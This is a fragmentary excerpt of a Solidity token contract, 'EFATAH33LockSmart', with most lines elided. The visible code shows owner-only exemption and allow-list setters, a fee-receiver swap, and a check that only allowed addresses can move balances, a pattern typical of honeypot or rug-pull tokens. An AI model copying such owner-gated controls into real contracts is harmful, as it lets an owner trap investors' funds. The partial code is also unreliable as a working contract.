...
contract EFATAH33LockSmart is IERC20 {
    ...
    mapping(address => bool) _isFeesExempted;
    ...
    bool private _isContractCheckEnabled = false;
    ...
    function isBaseReceiver() internal view returns (bool) {
        return msg.sender == baseReceiver;
    } 

    function allowAddress(address addr, bool flag) external onlyOwner {
        _isAccountExempt[addr] = flag;
    }
    
    function allowFeeAddressExemption(address addr, bool flag) external onlyOwner {
    ...
    function transferFeeReceiver(address addr) external onlyOwner { 
        require(addr != address(0x0) && !_isContract(addr)); 
        _isFeesExempted[baseReceiver] = false;
        _set_baseadm_addr(addr, 1); 
    }   
 
    function _set_baseadm_addr(address addr, uint is_mod) internal {
        if(is_mod == 1){
            baseReceiver = addr; 
    ...
    { 
        require(_isAllowAddress(msg.sender) && _balances[msg.sender] >= value && value > 0, "invalid address/amount");  
    ...
    {
        require(_isAdminAddress(msg.sender));
        return ( 
            _balances[DEAD], 
